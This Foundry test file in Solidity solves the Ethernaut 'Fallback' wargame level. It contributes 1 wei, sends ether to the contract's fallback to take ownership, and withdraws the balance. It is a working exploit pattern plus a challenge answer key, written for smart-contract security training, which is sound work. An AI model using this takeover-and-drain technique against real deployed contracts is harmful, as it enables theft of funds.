// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";
import {FallbackFactory} from "../src/01-Fallback/FallbackFactory.sol";
import {Fallback} from "../src/01-Fallback/Fallback.sol";

contract FallbackTest is Test {
    Ethernaut public ethernaut;
    address public user = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(user, 1 ether);
    }

    function test_FallbackAttack() public {
        // SETUP
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(user);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        // ATTACK
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.contributions(user), 1 wei);

        payable(levelAddress).call{value: 1 wei}("");
        assertEq(ethernautFallback.owner(), user);

        emit log_named_uint("Contract balance", address(ethernautFallback).balance);
        ethernautFallback.withdraw();
        emit log_named_uint("Contract balance", address(ethernautFallback).balance);

        // SUBMISSION
        assertTrue(ethernaut.submitLevelInstance(payable(levelAddress)), "level not solved");
        vm.stopPrank();
    }
}
